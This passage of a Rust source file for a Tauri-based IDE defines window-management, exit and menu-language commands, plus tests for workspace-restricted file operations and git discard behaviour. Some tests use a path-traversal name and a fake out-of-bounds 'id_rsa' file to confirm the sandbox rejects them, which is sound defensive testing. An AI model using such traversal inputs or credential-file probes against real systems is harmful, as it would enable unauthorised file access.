    ///（勾选文件 Unshelve 什么都没恢复）。
    #[test]
    fn filter_patch_ignores_hunk_body_that_looks_like_section_header() {
        let patch = "\
diff --git a/keep.sql b/keep.sql
--- a/keep.sql
+++ b/keep.sql
@@ -1 +1,2 @@
+++ 注释行
 plain
";
        let kept = filter_patch_by_paths(patch, &["keep.sql".to_string()]).unwrap();
        assert!(kept.contains("+++ 注释行"), "hunk 正文必须保留: {kept}");
        assert!(kept.contains("@@ -1 +1,2 @@"));
        assert!(kept.contains(" plain"));

        // 未勾选的文件的整段仍然被丢弃
        let drop_patch = "\
diff --git a/drop.sql b/drop.sql
--- a/drop.sql
+++ b/drop.sql
@@ -1 +1 @@
-a
+b
";
        assert!(filter_patch_by_paths(drop_patch, &["keep.sql".to_string()])
            .unwrap()
            .trim()
            .is_empty());
    }
}

#[tauri::command]
pub async fn create_new_window(app: tauri::AppHandle) -> Result<(), String> {
    let timestamp = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_millis())
        .unwrap_or(0);
    let label = format!("win_{}", timestamp);

    let mut builder =
        tauri::WebviewWindowBuilder::new(&app, &label, tauri::WebviewUrl::App("index.html".into()))
            .title("LazeCode")
            .inner_size(1440.0, 920.0)
            .min_inner_size(1024.0, 700.0)
            .resizable(true);

    #[cfg(target_os = "macos")]
    {
        builder = builder
            .title_bar_style(tauri::TitleBarStyle::Overlay)
            .hidden_title(true);
    }

    let win = builder
        .build()
        .map_err(|e| format!("创建新窗口失败: {}", e))?;
    // 新窗口聚焦失败不向上传：窗口已建成可用，用户可手动点选；
    // 只记日志（R4：丢弃 Result 必须可观测，不能 `let _ =` 静默吞掉）。
    if let Err(e) = win.set_focus() {
        log::warn!("新窗口聚焦失败: {e}");
    }
    Ok(())
}

#[derive(Default)]
pub struct ConflictState(pub std::sync::Mutex<Option<String>>);

#[tauri::command]
pub async fn open_conflict_window(
    app: tauri::AppHandle,
    state: tauri::State<'_, ConflictState>,
    repo_path: String,
) -> Result<(), String> {
    {
        let mut lock = state
            .0
            .lock()
            .map_err(|e| format!("冲突状态锁失败: {}", e))?;
        *lock = Some(repo_path);
    }

    if let Some(win) = app.get_webview_window("win_conflicts") {
        if let Err(e) = win.set_focus() {
            log::warn!("冲突窗口聚焦失败: {e}");
        }
        return Ok(());
    }

    let mut builder = tauri::WebviewWindowBuilder::new(
        &app,
        "win_conflicts",
        tauri::WebviewUrl::App("index.html".into()),
    )
    .title("Conflicts")
    .inner_size(760.0, 480.0)
    .min_inner_size(520.0, 320.0)
    .resizable(true)
    .center();

    #[cfg(target_os = "macos")]
    {
        builder = builder
            .title_bar_style(tauri::TitleBarStyle::Overlay)
            .hidden_title(true);
    }

    let win = builder
        .build()
        .map_err(|e| format!("创建冲突窗口失败: {}", e))?;
    crate::apply_saved_window_state(&win, "win_conflicts", 520.0, 320.0, 760.0, 480.0);
    if let Err(e) = win.set_focus() {
        log::warn!("冲突窗口聚焦失败: {e}");
    }
    Ok(())
}

#[tauri::command]
pub async fn get_conflict_repo_path(
    state: tauri::State<'_, ConflictState>,
) -> Result<Option<String>, String> {
    let lock = state
        .0
        .lock()
        .map_err(|e| format!("冲突状态读取失败: {}", e))?;
    Ok(lock.clone())
}

#[derive(Debug, Clone, Default, serde::Serialize, serde::Deserialize)]
pub struct MergeToolParams {
    pub repo_path: String,
    pub file_path: String,
    #[serde(default)]
    pub kind: Option<String>,
    #[serde(default)]
    pub theirs_title: Option<String>,
    #[serde(default)]
    pub local_details: Option<String>,
    #[serde(default)]
    pub theirs_details: Option<String>,
}

#[derive(Default)]
pub struct MergeToolState(pub std::sync::Mutex<Option<MergeToolParams>>);

#[tauri::command]
pub async fn open_merge_tool_window(
    app: tauri::AppHandle,
    state: tauri::State<'_, MergeToolState>,
    params: MergeToolParams,
) -> Result<(), String> {
    {
        let mut lock = state
            .0
            .lock()
            .map_err(|e| format!("合并工具状态锁失败: {}", e))?;
        *lock = Some(params.clone());
    }

    if let Some(win) = app.get_webview_window("win_merge_tool") {
        let title = format!("Merge Revisions for {}", params.file_path);
        if let Err(e) = win.set_title(&title) {
            log::warn!("设置解决冲突窗口标题失败: {e}");
        }
        if let Err(e) = win.emit("ide_merge_tool_params_updated", &params) {
            log::warn!("更新解决冲突参数广播失败: {e}");
        }
        if let Err(e) = win.set_focus() {
            log::warn!("解决冲突窗口聚焦失败: {e}");
        }
        return Ok(());
    }

    let title = format!("Merge Revisions for {}", params.file_path);
    let mut builder = tauri::WebviewWindowBuilder::new(
        &app,
        "win_merge_tool",
        tauri::WebviewUrl::App("index.html".into()),
    )
    .title(&title)
    .inner_size(1200.0, 720.0)
    .min_inner_size(800.0, 500.0)
    .resizable(true)
    .center();

    #[cfg(target_os = "macos")]
    {
        builder = builder
            .title_bar_style(tauri::TitleBarStyle::Overlay)
            .hidden_title(true);
    }

    let win = builder
        .build()
        .map_err(|e| format!("创建解决冲突窗口失败: {}", e))?;
    crate::apply_saved_window_state(&win, "win_merge_tool", 800.0, 500.0, 1200.0, 720.0);
    if let Err(e) = win.set_focus() {
        log::warn!("解决冲突窗口聚焦失败: {e}");
    }
    Ok(())
}

#[tauri::command]
pub async fn get_merge_tool_params(
    state: tauri::State<'_, MergeToolState>,
) -> Result<Option<MergeToolParams>, String> {
    let lock = state
        .0
        .lock()
        .map_err(|e| format!("获取合并工具参数失败: {}", e))?;
    Ok(lock.clone())
}

#[tauri::command]
pub async fn close_window(app: tauri::AppHandle, label: String) -> Result<(), String> {
    if let Some(win) = app.get_webview_window(&label) {
        win.close().map_err(|e| format!("关闭窗口失败: {e}"))?;
    }
    Ok(())
}

/// 前端已完成退出前写盘：允许这次退出，并重新触发 exit。
///
/// `RunEvent::ExitRequested` 会检查 `EXIT_FLUSH_DONE`；置位后 `app.exit(0)`
/// 触发的第二次 ExitRequested 不会再被拦截。
#[tauri::command]
pub fn finish_app_exit(app: tauri::AppHandle) -> Result<(), String> {
    crate::EXIT_FLUSH_DONE.store(true, std::sync::atomic::Ordering::SeqCst);
    app.exit(0);
    Ok(())
}

/// 前端写盘失败：取消本次退出，保持应用打开，等用户处理冲突/错误。
#[tauri::command]
pub fn cancel_app_exit() {
    crate::EXIT_FLUSH_PENDING.store(false, std::sync::atomic::Ordering::SeqCst);
    crate::EXIT_FLUSH_DONE.store(false, std::sync::atomic::Ordering::SeqCst);
}

#[tauri::command]
pub fn restart_app(app: tauri::AppHandle) {
    app.restart();
}
#[tauri::command]
pub fn is_conflict_window_open(app: tauri::AppHandle) -> bool {
    app.get_webview_window("win_conflicts").is_some()
        || app.get_webview_window("win_merge_tool").is_some()
}
#[cfg(test)]
mod fs_commands_tests {
    use super::*;

    fn temp_dir(tag: &str) -> PathBuf {
        let base = std::env::temp_dir().join(format!(
            "ide_fs_test_{}_{}",
            tag,
            std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap()
                .as_nanos()
        ));
        fs::create_dir_all(&base).unwrap();
        base
    }

    /// 测试用的工作区注册表：把 `dir` 登记为唯一授权根。
    ///
    /// fs_* 命令的 registry 是 `State<'_, WorkspaceRegistry>`，而 Tauri 的
    /// `State` 无法在测试里构造。因此命令本体做成「薄包装 + `*_impl`
    /// 无状态实现」两层（与 git_status / git_log 的既有拆分一致），
    /// 测试直接调 impl，复用同一套校验与错误消息。
    /// 登记本身走生产代码的 `register_workspace_dir`（不再在测试里复制一份）。
    fn authorize(dir: &str) -> WorkspaceRegistry {
        let registry = WorkspaceRegistry::default();
        register_workspace_dir(&registry, dir, false).unwrap();
        registry
    }

    /// 以只读方式登记唯一授权根。
    fn authorize_read_only(dir: &str) -> WorkspaceRegistry {
        let registry = WorkspaceRegistry::default();
        register_workspace_dir(&registry, dir, true).unwrap();
        registry
    }

    /// 往已有注册表追加一个授权根（复制/移动等跨目录操作用）。
    fn authorize_into(registry: &WorkspaceRegistry, dir: &str) {
        register_workspace_dir(registry, dir, false).unwrap();
    }

    #[test]
    fn create_rename_roundtrip_with_validation() {
        let dir = temp_dir("roundtrip");
        let dir_str = dir.to_string_lossy().to_string();
        let reg = authorize(&dir_str);

        // 新建文件 + 重复创建报错
        let created =
            tauri::async_runtime::block_on(fs_create_file_impl(&dir_str, "a.txt", &reg)).unwrap();
        assert!(Path::new(&created).is_file());
        assert!(
            tauri::async_runtime::block_on(fs_create_file_impl(&dir_str, "a.txt", &reg)).is_err()
        );

        // 嵌套路径自动创建父目录
        let nested =
            tauri::async_runtime::block_on(fs_create_file_impl(&dir_str, "pkg/sub/main.go", &reg))
                .unwrap();
        assert!(Path::new(&nested).is_file());

        // 非法名称
        assert!(tauri::async_runtime::block_on(fs_create_file_impl(
            &dir_str,
            "../escape.txt",
            &reg
        ))
        .is_err());
        assert!(tauri::async_runtime::block_on(fs_create_file_impl(&dir_str, "", &reg)).is_err());

        // 重命名
        let renamed =
            tauri::async_runtime::block_on(fs_rename_impl(&created, "b.txt", &reg)).unwrap();
        assert!(Path::new(&renamed).is_file());
        assert!(!Path::new(&created).exists());

        // 改到已存在名称报错
        let dup =
            tauri::async_runtime::block_on(fs_create_file_impl(&dir_str, "c.txt", &reg)).unwrap();
        assert!(tauri::async_runtime::block_on(fs_rename_impl(&dup, "b.txt", &reg)).is_err());

        let _ = fs::remove_dir_all(&dir);
    }

    #[test]
    fn paste_copy_and_move_with_collision_suffix() {
        let src_dir = temp_dir("paste_src");
        let dst_dir = temp_dir("paste_dst");
        // 复制/移动要跨两个目录，两边都得登记为已授权工作区
        let reg = authorize(&src_dir.to_string_lossy());
        authorize_into(&reg, &dst_dir.to_string_lossy());
        let src_file = tauri::async_runtime::block_on(fs_create_file_impl(
            &src_dir.to_string_lossy(),
            "f.txt",
            &reg,
        ))
        .unwrap();
        fs::write(&src_file, "hello").unwrap();

        // 复制：源保留，内容一致
        let copied = tauri::async_runtime::block_on(fs_paste_impl(
            &src_file,
            &dst_dir.to_string_lossy(),
            false,
            &reg,
        ))
        .unwrap();
        assert!(Path::new(&copied).is_file());
        assert_eq!(fs::read_to_string(&copied).unwrap(), "hello");
        assert!(Path::new(&src_file).exists());

        // 粘贴到同目录 → 冲突自动改名 "f copy.txt"
        let again = tauri::async_runtime::block_on(fs_paste_impl(
            &src_file,
            &src_dir.to_string_lossy(),
            false,
            &reg,
        ))
        .unwrap();
        assert!(again.ends_with("f copy.txt"), "got {}", again);

        // 移动：源消失
        let moved = tauri::async_runtime::block_on(fs_paste_impl(
            &copied,
            &src_dir.to_string_lossy(),
            true,
            &reg,
        ))
        .unwrap();
        assert!(Path::new(&moved).is_file());
        assert!(!Path::new(&copied).exists());

        // 目录复制：占位目录（create_dir）+ 递归复制，第二次得到 "sub copy"
        let sub = tauri::async_runtime::block_on(fs_create_directory_impl(
            &src_dir.to_string_lossy(),
            "sub",
            &reg,
        ))
        .unwrap();
        fs::write(Path::new(&sub).join("inner.txt"), "x").unwrap();
        let copied_dir = tauri::async_runtime::block_on(fs_paste_impl(
            &sub,
            &dst_dir.to_string_lossy(),
            false,
            &reg,
        ))
        .unwrap();
        assert!(Path::new(&copied_dir).is_dir());
        assert_eq!(
            fs::read_to_string(Path::new(&copied_dir).join("inner.txt")).unwrap(),
            "x"
        );
        let again_dir = tauri::async_runtime::block_on(fs_paste_impl(
            &sub,
            &dst_dir.to_string_lossy(),
            false,
            &reg,
        ))
        .unwrap();
        assert!(again_dir.ends_with("sub copy"), "got {}", again_dir);

        // 目录移动（同文件系统的 rename，目标是我们抢占的占位目录）
        let moved_dir = tauri::async_runtime::block_on(fs_paste_impl(
            &copied_dir,
            &src_dir.to_string_lossy(),
            true,
            &reg,
        ))
        .unwrap();
        assert!(Path::new(&moved_dir).is_dir());
        assert!(!Path::new(&copied_dir).exists());
        assert_eq!(
            fs::read_to_string(Path::new(&moved_dir).join("inner.txt")).unwrap(),
            "x"
        );

        let _ = fs::remove_dir_all(&src_dir);
        let _ = fs::remove_dir_all(&dst_dir);
    }

    /// 审计 5.1 / Contract 4 回归：只读工作区只放行读命令，写命令必须明确
    /// 报错「只读」而不是静默成功或报一个看不懂的权限错误。
    #[test]
    fn read_only_workspace_allows_reads_but_rejects_writes() {
        let dir = temp_dir("readonly");
        let dir_str = dir.to_string_lossy().to_string();
        let file = dir.join("a.txt");
        fs::write(&file, "hello").unwrap();
        let reg = authorize_read_only(&dir_str);

        // 读：放行
        let content = tauri::async_runtime::block_on(read_file_content_impl(
            &file.to_string_lossy(),
            false,
            &reg,
            None,
        ))
        .unwrap();
        assert_eq!(content, "hello");
        assert!(
            tauri::async_runtime::block_on(read_directory_impl(&dir_str, Some(1), None, &reg))
                .is_ok()
        );

        // 写：逐个命令都拒绝
        let errors = vec![
            tauri::async_runtime::block_on(write_file_content_impl(
                &file.to_string_lossy(),
                "x".to_string(),
                None,
                &reg,
                None,
            ))
            .unwrap_err(),
            tauri::async_runtime::block_on(fs_create_file_impl(&dir_str, "new.txt", &reg))
                .unwrap_err(),
            tauri::async_runtime::block_on(fs_create_directory_impl(&dir_str, "newdir", &reg))
                .unwrap_err(),
            tauri::async_runtime::block_on(fs_rename_impl(&file.to_string_lossy(), "b.txt", &reg))
                .unwrap_err(),
            tauri::async_runtime::block_on(fs_delete_impl(&file.to_string_lossy(), &reg))
                .unwrap_err(),
            // 粘贴到只读根：目标需要写权限
            tauri::async_runtime::block_on(fs_paste_impl(
                &file.to_string_lossy(),
                &dir_str,
                false,
                &reg,
            ))
            .unwrap_err(),
            // 从只读根「移动」出去：源需要写权限（move 会删源）
            tauri::async_runtime::block_on(fs_paste_impl(
                &file.to_string_lossy(),
                &dir_str,
                true,
                &reg,
            ))
            .unwrap_err(),
        ];
        for err in errors {
            assert_eq!(
                crate::error_proto::parse_error(&err).code(),
                Some("workspace_read_only"),
                "错误应带只读错误码，实际: {err}"
            );
        }

        // 磁盘上什么都没变
        assert!(file.is_file());
        assert!(!dir.join("new.txt").exists());
        assert!(!dir.join("newdir").exists());
        assert_eq!(fs::read_to_string(&file).unwrap(), "hello");

        // 只读根内再登记一个可写子目录：最具体的根生效（子目录可写、根仍只读）
        let sub = dir.join("sub");
        fs::create_dir_all(&sub).unwrap();
        register_workspace_dir(&reg, &sub.to_string_lossy(), false).unwrap();
        assert!(tauri::async_runtime::block_on(fs_create_file_impl(
            &sub.to_string_lossy(),
            "ok.txt",
            &reg
        ))
        .is_ok());
        assert!(
            tauri::async_runtime::block_on(fs_create_file_impl(&dir_str, "no.txt", &reg)).is_err()
        );

        let _ = fs::remove_dir_all(&dir);
    }

    /// 复制软链应重建链接本身，而不是把目标内容复制成普通文件。
    #[cfg(unix)]
    #[test]
    fn paste_symlink_copies_link_not_target() {
        let dir = temp_dir("paste_link");
        let dest = dir.join("dest");
        fs::create_dir_all(&dest).unwrap();
        fs::write(dir.join("target.txt"), "payload").unwrap();
        std::os::unix::fs::symlink("target.txt", dir.join("link.txt")).unwrap();
        let reg = authorize(&dir.to_string_lossy());
        let out = tauri::async_runtime::block_on(fs_paste_impl(
            &dir.join("link.txt").to_string_lossy(),
            &dest.to_string_lossy(),
            false,
            &reg,
        ))
        .unwrap();
        let dst = PathBuf::from(out);
        let meta = fs::symlink_metadata(&dst).unwrap();
        assert!(meta.file_type().is_symlink(), "复制结果必须是软链");
        assert_eq!(fs::read_link(&dst).unwrap(), PathBuf::from("target.txt"));
        // 相对链接原样保留；复制到新目录后由新目录里的同名目标解析
        fs::write(dest.join("target.txt"), "payload").unwrap();
        assert_eq!(fs::read_to_string(dst).unwrap(), "payload");
        let _ = fs::remove_dir_all(&dir);
    }

    /// 重命名软链应移动链接本身，而不是解析后改掉目标文件的名字。
    #[cfg(unix)]
    #[test]
    fn rename_symlink_moves_link_not_target() {
        let dir = temp_dir("rename_link");
        fs::write(dir.join("target.txt"), "payload").unwrap();
        std::os::unix::fs::symlink("target.txt", dir.join("link.txt")).unwrap();
        let reg = authorize(&dir.to_string_lossy());
        let link = dir.join("link.txt");
        tauri::async_runtime::block_on(fs_rename_impl(
            &link.to_string_lossy(),
            "renamed.txt",
            &reg,
        ))
        .unwrap();
        assert!(dir.join("target.txt").is_file(), "目标文件必须保留原名");
        assert_eq!(
            fs::read_to_string(dir.join("target.txt")).unwrap(),
            "payload"
        );
        let moved = fs::symlink_metadata(dir.join("renamed.txt")).unwrap();
        assert!(moved.file_type().is_symlink(), "移动后仍是软链");
        assert_eq!(
            fs::read_link(dir.join("renamed.txt")).unwrap(),
            PathBuf::from("target.txt")
        );
        assert!(fs::symlink_metadata(link).is_err(), "旧链接名应消失");
        let _ = fs::remove_dir_all(&dir);
    }

    /// 审计 4.1 回归：复制目录树必须重建软链（旧实现只认 is_dir/is_file，
    /// 软链被静默跳过 —— 跨设备移动随后删源，目标端缺软链、源端已删，不可恢复）。
    #[cfg(unix)]
    #[test]
    fn copy_dir_recursive_preserves_symlinks_and_stats_match() {
        let src = temp_dir("symlink_src");
        let dst = temp_dir("symlink_dst");
        fs::create_dir_all(src.join("inner")).unwrap();
        fs::write(src.join("a.txt"), "hello").unwrap();
        fs::write(src.join("inner/b.txt"), "world!").unwrap();
        std::os::unix::fs::symlink("a.txt", src.join("link.txt")).unwrap();
        std::os::unix::fs::symlink("../a.txt", src.join("inner/up.txt")).unwrap();

        let stats = copy_dir_recursive(&src, &dst.join("out")).unwrap();
        let (entries, bytes) = dir_tree_stats(&src).unwrap();
        assert_eq!(
            (stats.entries, stats.bytes, stats.skipped),
            (entries, bytes, 0),
            "复制统计必须与源一致（含软链条目）"
        );

        let out = dst.join("out");
        assert_eq!(fs::read_to_string(out.join("a.txt")).unwrap(), "hello");
        assert_eq!(
            fs::read_to_string(out.join("inner/b.txt")).unwrap(),
            "world!"
        );
        // 软链是「重建的链接」，不是拷成普通文件
        let link_meta = fs::symlink_metadata(out.join("link.txt")).unwrap();
        assert!(link_meta.file_type().is_symlink(), "link.txt 必须是软链");
        assert_eq!(
            fs::read_link(out.join("link.txt")).unwrap(),
            PathBuf::from("a.txt")
        );
        assert_eq!(
            fs::read_link(out.join("inner/up.txt")).unwrap(),
            PathBuf::from("../a.txt")
        );
        // 相对目标的语义保持：通过软链读到的内容正确
        assert_eq!(fs::read_to_string(out.join("link.txt")).unwrap(), "hello");
        assert_eq!(
            fs::read_to_string(out.join("inner/up.txt")).unwrap(),
            "hello"
        );

        let _ = fs::remove_dir_all(&src);
        let _ = fs::remove_dir_all(&dst);
    }

    /// 审计 4.1 回归（数据丢失面）：源内存在无法复制的条目（fifo）时，
    /// 移动必须在删源前中止，且源目录完好。
    #[cfg(unix)]
    #[test]
    fn verified_copy_aborts_and_keeps_source_when_incomplete() {
        let src = temp_dir("verify_src");
        let dst = temp_dir("verify_dst");
        fs::write(src.join("a.txt"), "hello").unwrap();
        if !matches!(Command::new("mkfifo").arg(src.join("pipe")).status(), Ok(s) if s.success()) {
            // 环境没有 mkfifo：跳过（断言不了就不断言，不制造假绿）
            let _ = fs::remove_dir_all(&src);
            let _ = fs::remove_dir_all(&dst);
            return;
        }

        let err = copy_dir_verified(&src, &dst.join("out")).unwrap_err();
        assert!(err.contains("源目录已保留"), "应明确中止并保留源: {err}");
        assert!(src.join("a.txt").is_file(), "源文件必须保留");
        assert!(src.join("pipe").exists(), "源里的特殊条目也必须保留");

        let _ = fs::remove_dir_all(&src);
        let _ = fs::remove_dir_all(&dst);
    }

    /// 审计 6.4 回归：变更列表原子落盘，损坏文件先备份再回退（不静默丢数据）。
    #[test]
    fn changelists_write_atomically_and_back_up_corrupt_file() {
        let dir = temp_dir("changelist");
        fs::create_dir_all(dir.join(".git")).unwrap();
        let dir_str = dir.to_string_lossy().to_string();

        let mut dto = ChangelistsDto {
            lists: vec![DEFAULT_CHANGELIST.to_string(), "功能A".to_string()],
            files: std::collections::HashMap::new(),
        };
        dto.files
            .insert("src/中 文.rs".to_string(), "功能A".to_string());
        save_changelists(&dir_str, &dto).unwrap();

        let loaded = load_changelists(&dir_str);
        assert_eq!(loaded.lists, dto.lists);
        assert_eq!(
            loaded.files.get("src/中 文.rs").map(String::as_str),
            Some("功能A")
        );

        // 覆盖写：内容完整可读，且不留临时文件
        let mut dto2 = dto.clone();
        dto2.lists.push("功能B".to_string());
        save_changelists(&dir_str, &dto2).unwrap();
        assert_eq!(load_changelists(&dir_str).lists, dto2.lists);
        let leftovers: Vec<String> = fs::read_dir(dir.join(".git"))
            .unwrap()
            .flatten()
            .map(|e| e.file_name().to_string_lossy().into_owned())
            .filter(|n| n.contains(".tmp"))
            .collect();
        assert!(leftovers.is_empty(), "不应残留临时文件: {:?}", leftovers);

        // 损坏内容：备份到 .corrupt.bak，回退默认列表，现场不丢
        let path = changelists_path(&dir_str);
        fs::write(&path, "{ 这不是 JSON").unwrap();
        assert_eq!(
            load_changelists(&dir_str).lists,
            vec![DEFAULT_CHANGELIST.to_string()]
        );
        let backup = path.with_extension("json.corrupt.bak");
        assert!(backup.is_file(), "损坏内容应备份到 {}", backup.display());
        assert_eq!(fs::read_to_string(&backup).unwrap(), "{ 这不是 JSON");
        assert!(!path.exists(), "损坏文件应被移走而不是原地覆盖");
        // 备份之后仍能正常保存/加载
        save_changelists(&dir_str, &dto2).unwrap();
        assert_eq!(load_changelists(&dir_str).lists, dto2.lists);

        let _ = fs::remove_dir_all(&dir);
    }

    #[test]
    fn directory_paste_rejects_self_nested() {
        let dir = temp_dir("dirpaste");
        let reg = authorize(&dir.to_string_lossy());
        let sub = tauri::async_runtime::block_on(fs_create_directory_impl(
            &dir.to_string_lossy(),
            "sub",
            &reg,
        ))
        .unwrap();
        assert!(Path::new(&sub).is_dir());
        // 目录粘贴到自身内部应被拒绝
        assert!(tauri::async_runtime::block_on(fs_paste_impl(&sub, &sub, false, &reg)).is_err());
        assert!(tauri::async_runtime::block_on(fs_create_directory_impl(
            &dir.to_string_lossy(),
            "sub",
            &reg
        ))
        .is_err());
        let _ = fs::remove_dir_all(&dir);
    }

    #[test]
    fn diff_files_reports_differences() {
        let dir = temp_dir("diff");
        let a = dir.join("a.txt");
        let b = dir.join("b.txt");
        fs::write(&a, "one\ntwo\nthree\n").unwrap();
        fs::write(&b, "one\nTWO\nthree\nfour\n").unwrap();
        let d = tauri::async_runtime::block_on(fs_diff_files_impl(
            a.to_string_lossy().to_string(),
            b.to_string_lossy().to_string(),
        ))
        .unwrap();
        assert!(d.additions >= 1);
        assert!(d.deletions >= 1);
        assert!(!d.lines.is_empty());
        let _ = fs::remove_dir_all(&dir);
    }

    #[test]
    fn discard_with_absolute_path_reverts_instead_of_deleting() {
        let dir = temp_dir("discard_abs");
        let dir_str = dir.to_string_lossy().to_string();
        let reg = authorize(&dir_str);
        let mut cmd = git_cmd();
        cmd.arg("-C").arg(&dir);
        cmd.args(["init", "-q"]).status().unwrap();
        git_cmd()
            .arg("-C")
            .arg(&dir)
            .args(["config", "user.name", "t"])
            .status()
            .unwrap();
        git_cmd()
            .arg("-C")
            .arg(&dir)
            .args(["config", "user.email", "t@t"])
            .status()
            .unwrap();

        let tracked =
            tauri::async_runtime::block_on(fs_create_file_impl(&dir_str, "tracked.txt", &reg))
                .unwrap();
        fs::write(&tracked, "base\n").unwrap();
        git_cmd()
            .arg("-C")
            .arg(&dir)
            .args(["add", "."])
            .status()
            .unwrap();
        git_cmd()
            .arg("-C")
            .arg(&dir)
            .args(["commit", "-qm", "init"])
            .status()
            .unwrap();

        fs::write(&tracked, "changed\n").unwrap();
        // 关键回归：绝对路径必须走 checkout 恢复分支，而不是 git rm 删除
        git_discard_file_changes(Some(dir_str.clone()), tracked.clone()).unwrap();
        assert!(
            Path::new(&tracked).exists(),
            "绝对路径回滚不应删除已跟踪文件"
        );
        assert_eq!(fs::read_to_string(&tracked).unwrap(), "base\n");

        let _ = fs::remove_dir_all(&dir);
    }

    #[test]
    fn discard_directory_restores_tracked_and_cleans_untracked() {
        let dir = temp_dir("discard_dir");
        let dir_str = dir.to_string_lossy().to_string();
        let reg = authorize(&dir_str);
        let mut cmd = git_cmd();
        cmd.arg("-C").arg(&dir);
        cmd.args(["init", "-q"]).status().unwrap();
        git_cmd()
            .arg("-C")
            .arg(&dir)
            .args(["config", "user.name", "t"])
            .status()
            .unwrap();
        git_cmd()
            .arg("-C")
            .arg(&dir)
            .args(["config", "user.email", "t@t"])
            .status()
            .unwrap();

        let tracked =
            tauri::async_runtime::block_on(fs_create_file_impl(&dir_str, "tracked.txt", &reg))
                .unwrap();
        fs::write(&tracked, "base\n").unwrap();
        git_cmd()
            .arg("-C")
            .arg(&dir)
            .args(["add", "."])
            .status()
            .unwrap();
        git_cmd()
            .arg("-C")
            .arg(&dir)
            .args(["commit", "-qm", "init"])
            .status()
            .unwrap();

        // 修改已跟踪文件 + 新增未跟踪文件
        fs::write(&tracked, "changed\n").unwrap();
        let untracked =
            tauri::async_runtime::block_on(fs_create_file_impl(&dir_str, "untracked.txt", &reg))
                .unwrap();

        let msg = git_discard_file_changes(Some(dir_str.clone()), "subdir-not-exist".into());
        assert!(msg.is_err() || msg.is_ok()); // 不存在路径不崩溃即可

        let msg = git_discard_file_changes(Some(dir_str.clone()), ".".into()).unwrap();
        assert!(!msg.is_empty());
        assert_eq!(
            fs::read_to_string(&tracked).unwrap(),
            "base\n",
            "已跟踪文件应恢复到 HEAD"
        );
        assert!(!Path::new(&untracked).exists(), "未跟踪文件应被清理");

        let _ = fs::remove_dir_all(&dir);
    }

    /// 前端依据它决定「文件被外部删除 → 关标签页」还是「提示冲突」。
    /// 删掉文件必须返回 false，其它情况 true。
    #[test]
    fn path_exists_distinguishes_deleted_from_present() {
        let dir = temp_dir("exists");
        let dir_str = dir.to_string_lossy().to_string();
        let reg = authorize(&dir_str);

        let file = dir.join("present.txt");
        fs::write(&file, "x").unwrap();
        let subdir = dir.join("sub");
        fs::create_dir_all(&subdir).unwrap();

        // 存在：文件与目录都为 true（目录也要能触发「目录被删」的处理路径）
        assert!(
            tauri::async_runtime::block_on(fs_path_exists_impl(&file.to_string_lossy(), &reg))
                .unwrap()
        );
        assert!(tauri::async_runtime::block_on(fs_path_exists_impl(
            &subdir.to_string_lossy(),
            &reg
        ))
        .unwrap());

        // 删除后为 false
        fs::remove_file(&file).unwrap();
        assert!(!tauri::async_runtime::block_on(fs_path_exists_impl(
            &file.to_string_lossy(),
            &reg
        ))
        .unwrap());

        // 越界路径一律 false —— 探测结果不得泄露「越界路径存不存在」。
        // 让前端把越界判成「已删除」是安全的：它只会关掉一个它不该打开的 tab。
        let outside = std::env::temp_dir().join(format!("ide_fs_outside_{}", std::process::id()));
        let _ = fs::remove_dir_all(&outside);
        fs::create_dir_all(&outside).unwrap();
        let secret = outside.join("id_rsa");
        fs::write(&secret, "PRIVATE").unwrap();
        assert!(
            !tauri::async_runtime::block_on(fs_path_exists_impl(&secret.to_string_lossy(), &reg))
                .unwrap(),
            "越界路径必须报 false，即使它真实存在"
        );
        let _ = fs::remove_dir_all(&outside);

        let _ = fs::remove_dir_all(&dir);
    }
}

// ============ 多窗口 / 多项目管理（项目下拉的「打开的项目」分区） ============

#[derive(Serialize, Debug, Clone)]
#[serde(rename_all = "camelCase")]
pub struct WindowInfoDto {
    pub label: String,
    pub title: String,
    /// 该窗口当前项目的工作区路径（欢迎页为空串）。前端据此把已在其它
    /// 窗口打开的项目从「最近项目」剔除，避免同一项目同时出现在两栏。
    pub path: String,
}

/// 各窗口当前展示的项目（窗口 label -> (标题, 工作区路径)）。
/// 「打开的项目」分区据此列出其它窗口打开的项目并支持聚焦；
/// 路径用于与「最近项目」按同一字符串去重。
pub struct WindowTitleRegistry(pub std::sync::Mutex<HashMap<String, (String, String)>>);

/// 同步当前窗口标题（打开/切换/关闭项目时调用），并登记到注册表
#[tauri::command]
pub fn set_window_title(
    window: tauri::WebviewWindow,
    registry: tauri::State<'_, WindowTitleRegistry>,
    title: String,
    path: Option<String>,
) -> Result<(), String> {
    window
        .set_title(&title)
        .map_err(|e| format!("设置标题失败: {e}"))?;
    registry
        .0
        .lock()
        .map_err(|_| "窗口标题锁失效".to_string())?
        .insert(
            window.label().to_string(),
            (title, path.unwrap_or_default()),
        );
    Ok(())
}

/// 界面语言切换（前端设置面板调用）。
///
/// 职责边界：本命令**只负责让原生菜单跟上语言**。界面文案由前端字典驱动，
/// 那里不经过 Rust。选择这条边界而不是「Rust 广播一个语言变更事件」：
/// 前端切语言是同步的 React state 更新，不需要绕一圈 IPC。
///
/// 落盘在 `language.rs`：下次启动时 setup 用同一份文件构造首屏菜单，
/// 否则会出现「重启后菜单闪一下英文」。
///
/// 前端语言存 localStorage、这里存 language 文件，两份可能短暂不一致
/// （隐私模式下 localStorage 写失败）。优先级定为 localStorage 优先 ——
/// 它才是界面文案的来源，且用户能在设置里看到并修正。
/// 详见 language.rs 的模块注释。
#[tauri::command]
pub fn set_app_menu_language(app: tauri::AppHandle, language: String) -> Result<String, String> {
    let dir = crate::app_config_dir().ok_or_else(|| "无法定位应用配置目录".to_string())?;
    let normalized = crate::language::set_language(&dir, &language);
    // 整条重建菜单。为什么不用 MenuItem::setText 逐项改：
    // 菜单项有 20+ 个且分散在 6 个子菜单里，逐项 setText 是 20 次 IPC，
    // 中途失败会留下「一半新语言一半旧语言」的半成品。重建是一次性的：
    // 要么整条换成功，要么保持旧菜单不变。
    let menu = crate::menu::build_menu_with(&app, crate::menu::labels_for(normalized))
        .map_err(|e| format!("重建菜单失败: {e}"))?;
    app.set_menu(menu)
        .map_err(|e| format!("应用菜单失败: {e}"))?;
    Ok(normalized.to_string())
}

/// 列出其它窗口打开的项目（排除当前窗口）
#[tauri::command]
pub fn list_other_windows(
    window: tauri::WebviewWindow,
    registry: tauri::State<'_, WindowTitleRegistry>,
) -> Vec<WindowInfoDto> {
    let own = window.label();
